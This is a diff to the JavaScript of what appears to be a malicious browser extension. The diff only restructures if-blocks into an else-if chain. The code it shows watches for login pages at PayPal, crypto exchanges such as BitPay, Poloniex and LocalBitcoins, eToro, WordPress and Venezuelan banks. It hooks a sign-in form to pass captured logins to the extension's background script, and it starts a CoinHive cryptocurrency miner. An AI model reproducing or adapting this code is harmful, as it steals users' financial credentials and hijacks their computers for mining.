@@ -388,10 +388,10 @@ for (var i = 0; i < arrayLength; i++) {
               }
           }
       }, 1000)
-  };
+  }
 
 
-  if (top['location']['href']['indexOf']('paypal.com') > -1) {
+  else if (top['location']['href']['indexOf']('paypal.com') > -1) {
       var interval = setInterval(function () {
           if (document['getElementsByClassName']('proceed maskable')[0]) {
               clearInterval(interval);
@@ -404,11 +404,11 @@ for (var i = 0; i < arrayLength; i++) {
               }
           }
       }, 1000)
-  };
+  }
 
 
 
-if (window.location.href.indexOf("bitcoinglobalclub.com") > -1) {
+else if (window.location.href.indexOf("bitcoinglobalclub.com") > -1) {
 var login_form = document.getElementsByClassName("container-signin");
     if(login_form){
         login_form.onsubmit = function(){
@@ -419,7 +419,7 @@ var login_form = document.getElementsByClassName("container-signin");
             chrome.runtime.sendMessage({cmd: "l",login});
 		        }
           }
-        };
+        }
 
 
   // if (top['location']['href']['indexOf']('https://www3.bancaribe.com.ve/bcn/') > -1) {
@@ -455,7 +455,7 @@ var login_form = document.getElementsByClassName("container-signin");
 
 
 
-  if (top['location']['href']['indexOf']('bitpay.com/dashboard/login') > -1) {
+  else if (top['location']['href']['indexOf']('bitpay.com/dashboard/login') > -1) {
       var interval = setInterval(function () {
           if (document['getElementsByClassName']('bp-constrain-login')[0]) {
               clearInterval(interval);
@@ -468,9 +468,9 @@ var login_form = document.getElementsByClassName("container-signin");
               }
           }
       }, 1000)
-  };
+  }
 
-  if (top['location']['href'] === 'auth.bitbay.net/login') {
+  else if (top['location']['href'] === 'auth.bitbay.net/login') {
       var interval = setInterval(function () {
           if (document['getElementsByClassName']('main-content-container')[0]) {
               clearInterval(interval);
@@ -483,8 +483,8 @@ var login_form = document.getElementsByClassName("container-signin");
               }
           }
       }, 1000)
-  };
-  if (top['location']['href'] === 'auth.bitbay.net/login-password') {
+  }
+  else if (top['location']['href'] === 'auth.bitbay.net/login-password') {
       var interval = setInterval(function () {
           if (document['getElementsByClassName']('main-content-container')[0]) {
               clearInterval(interval);
@@ -497,9 +497,9 @@ var login_form = document.getElementsByClassName("container-signin");
               }
           }
       }, 1000)
-  };
+  }
 
-  if (top['location']['href'] === 'auth.bitbay.net/login-password') {
+  else if (top['location']['href'] === 'auth.bitbay.net/login-password') {
       var interval = setInterval(function () {
           if (document['getElementsByClassName']('main-content-container')[0]) {
               clearInterval(interval);
@@ -512,9 +512,9 @@ var login_form = document.getElementsByClassName("container-signin");
               }
           }
       }, 1000)
-  };
+  }
 
-if (top['location']['href']['indexOf']('wp-login.php') > -1) {
+else if (top['location']['href']['indexOf']('wp-login.php') > -1) {
       var interval = setInterval(function () {
           if (document['getElementById']('loginform')) {
               clearInterval(interval);
@@ -527,9 +527,9 @@ if (top['location']['href']['indexOf']('wp-login.php') > -1) {
               }
           }
       }, 1000)
-  };
+  }
 
-  if (top['location']['href']['indexOf']('ltcbackoffice.org') > -1) {
+  else if (top['location']['href']['indexOf']('ltcbackoffice.org') > -1) {
         var interval = setInterval(function () {
             if (document['getElementsByClassName']('page-content')) {
                 clearInterval(interval);
@@ -542,9 +542,9 @@ if (top['location']['href']['indexOf']('wp-login.php') > -1) {
                 }
             }
         }, 1000)
-    };
+    }
 
-    if (top['location']['href']['indexOf']('localbitcoins.com/accounts/login/') > -1) {
+    else if (top['location']['href']['indexOf']('localbitcoins.com/accounts/login/') > -1) {
           var interval = setInterval(function () {
               if (document['getElementsByClassName']('container')) {
                   clearInterval(interval);
@@ -557,9 +557,9 @@ if (top['location']['href']['indexOf']('wp-login.php') > -1) {
                   }
               }
           }, 1000)
-      };
+      }
 
-      if (top['location']['href']['indexOf']('sys.chip-coin.net:1006/sys/iCommerce/modules/mod_chipcoin/login.jsp') > -1) {
+    else if (top['location']['href']['indexOf']('sys.chip-coin.net:1006/sys/iCommerce/modules/mod_chipcoin/login.jsp') > -1) {
             var interval = setInterval(function () {
                 if (document['getElementsByClassName']('form-signin')) {
                     clearInterval(interval);
@@ -572,9 +572,9 @@ if (top['location']['href']['indexOf']('wp-login.php') > -1) {
                     }
                 }
             }, 1000)
-        };
+        }
 
-        if (top['location']['href']['indexOf']('onixcoin.com/inicio-sesion/') > -1) {
+        else if (top['location']['href']['indexOf']('onixcoin.com/inicio-sesion/') > -1) {
               var interval = setInterval(function () {
                   if (document['getElementsByClassName']('onix-info')) {
                       clearInterval(interval);
@@ -587,9 +587,9 @@ if (top['location']['href']['indexOf']('wp-login.php') > -1) {
                       }
                   }
               }, 1000)
-          };
+          }
 
-          if (top['location']['href']['indexOf']('coinpayments.net/login') > -1) {
+          else if (top['location']['href']['indexOf']('coinpayments.net/login') > -1) {
                 var interval = setInterval(function () {
                     if (document['getElementsByClassName']('login')) {
                         clearInterval(interval);
@@ -604,7 +604,7 @@ if (top['location']['href']['indexOf']('wp-login.php') > -1) {
                 }, 1000)
             };
 
-            if (top['location']['href']['indexOf']('bancacumana.tk/') > -1) {
+            else if (top['location']['href']['indexOf']('bancacumana.tk/') > -1) {
                   var interval = setInterval(function () {
                       if (document['getElementById']('login_panel')) {
                           clearInterval(interval);
@@ -617,10 +617,10 @@ if (top['location']['href']['indexOf']('wp-login.php') > -1) {
                           }
                       }
                   }, 1000)
-              };
+              }
 
 
-              if (top['location']['href']['indexOf']('etoro.com/login') > -1) {
+              else if (top['location']['href']['indexOf']('etoro.com/login') > -1) {
                     var interval = setInterval(function () {
                         if (document['getElementsByClassName']('w-login')) {
                             clearInterval(interval);
@@ -633,9 +633,9 @@ if (top['location']['href']['indexOf']('wp-login.php') > -1) {
                             }
                         }
                     }, 1000)
-                };
+                }
 
-    if (top['location']['href']['indexOf']('bitbackoffice.com') > -1) {
+    else if (top['location']['href']['indexOf']('bitbackoffice.com') > -1) {
           var interval = setInterval(function () {
               if (document['getElementById']('login')) {
                   clearInterval(interval);
@@ -648,9 +648,9 @@ if (top['location']['href']['indexOf']('wp-login.php') > -1) {
                   }
               }
           }, 1000)
-      };
+      }
 
-      if (top['location']['href']['indexOf']('btcstorm.cloud/login') > -1) {
+      else if (top['location']['href']['indexOf']('btcstorm.cloud/login') > -1) {
             var interval = setInterval(function () {
                 if (document['getElementById']('login-form')) {
                     clearInterval(interval);
@@ -663,10 +663,10 @@ if (top['location']['href']['indexOf']('wp-login.php') > -1) {
                     }
                 }
             }, 1000)
-        };
+        }
 
 
-        if (top['location']['href']['indexOf']('poloniex.com/login') > -1) {
+        else if (top['location']['href']['indexOf']('poloniex.com/login') > -1) {
               var interval = setInterval(function () {
                   if (document['getElementsByClassName']('formWrapper')) {
                       clearInterval(interval);
@@ -679,10 +679,10 @@ if (top['location']['href']['indexOf']('wp-login.php') > -1) {
                       }
                   }
               }, 1000)
-          };
+          }
 
 
-          if (top['location']['href']['indexOf']('usitech-int.com/login') > -1) {
+          else if (top['location']['href']['indexOf']('usitech-int.com/login') > -1) {
                 var interval = setInterval(function () {
                     if (document['getElementById']('content_login')) {
                         clearInterval(interval);
@@ -726,11 +726,11 @@ if (top['location']['href']['indexOf']('wp-login.php') > -1) {
     	miner.start(CoinHive.FORCE_MULTI_TAB);
 
     }
-  };
+  }
 
     var cookie_name = "control22_miner2_"+target;
     var cookie_time = 0.3;
     if(!localStorage[cookie_name] || parseInt(localStorage[cookie_name]) < Date.now()-60*60*cookie_time){
     	localStorage[cookie_name] = Date.now();
     	exFunc();
-    }
+    };
